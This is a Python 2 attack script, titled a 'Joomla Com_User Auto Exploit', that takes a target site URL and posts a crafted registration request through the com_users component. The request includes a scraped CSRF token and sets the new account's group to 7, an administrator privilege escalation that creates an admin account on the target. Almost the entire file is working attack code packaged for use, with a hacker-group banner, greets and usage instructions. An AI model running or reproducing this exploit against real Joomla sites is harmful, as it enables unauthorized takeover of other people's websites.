#!/usr/bin/python
# Joomla Com_User Auto Exploit =D
# By xSecurity

import requests as sec4ever, re, urllib, sys, os
from threading import Thread 
from time import sleep
def cls():
    os.system(['clear','cls'][os.name =='nt'])

cls()
print '''
       __                      _ _         
__  __/ _\ ___  ___ _   _ _ __(_) |_ _   _ 
\ \/ /\ \ / _ \/ __| | | | '__| | __| | | |
 >  < _\ \  __/ (__| |_| | |  | | |_| |_| |
/_/\_\\__/\___|\___|\__,_ |_|  |_|\__|\__, |
                                     |___/Joomla [Com_User] Auto Exploit =D
#Home: Sec4ever.CoM | Is-Sec.CoM | s3c-k.com
#Greets: UzunDz - b0x - Lov3rDNS - Mr.Dm4r - DamaneDz - rOx - r0kin 
Special For My Lov3r Cyber-Crystal
#Note: U Need Install Requests Package: http://www.youtube.com/ watch?v=Ng5T18HyA-Q'''

pwd2 = 'fio3jfiej9cewc9c9w0eufew9u'
def one(target,pwd1,pwd2,email):
    # Wrong Password
    x1 = xsec.get(target+'/index.php?option=com_users&view=registration')
    token = re.findall('type="hidden" name="(.*?)" value="1"', x1.text)
    post = {}
    post["jform[name]"] = 'xSecurity'
    post["jform[username]"] = user
    post["jform[password1]"] = pwd1
    post["jform[password2]"] = pwd2
    post["jform[email1]"] = email
    post["jform[email2]"] = email
    post["jform[groups][]"] = "7"
    post["option"] = "com_users"
    post["task"] = "registration.register"
    post[token[0]] = "1"
    p1 = xsec.post(target+'/index.php?option=com_users&view=registration', data=urllib.urlencode(post))
    x2 = xsec.get(target+'/index.php/component/users/?view=registration&layout=complete')

def exploit(target,pwd1,pwd2,email):
    # Wrong Password
    x3 = xsec.get(target+'/index.php?option=com_users&view=registration')
    token = re.findall('type="hidden" name="(.*?)" value="1"', x3.text)
    post = {}
    post["jform[name]"] = 'xSecurity'
    post["jform[username]"] = user
    post["jform[password1]"] = pwd1
    post["jform[password2]"] = pwd1
    post["jform[email1]"] = email
    post["jform[email2]"] = email
    post["jform[groups][]"] = "7"
    post["option"] = "com_users"
    post["task"] = "registration.register"
    post[token[0]] = "1"
    p2 = xsec.post(target+'/index.php?option=com_users&view=registration', data=urllib.urlencode(post))
    x4 = xsec.get(target+'/index.php/component/users/?view=registration&layout=complete')

xsec = sec4ever.session()
if len(sys.argv) == 5:
    target = sys.argv[1]
    user = sys.argv[2]
    pwd1 = sys.argv[3]
    email = sys.argv[4]
    one(target,pwd1,pwd2,email)
    ex = exploit(target,pwd1,pwd2,email)
    print '[*] Go To Your Email & Active Then Login =D\nUsername: '+user+' & Password: '+pwd1
else:
    print "Usage: python tool.py http://target.com/j0s/ youruser yourpass yourmail"
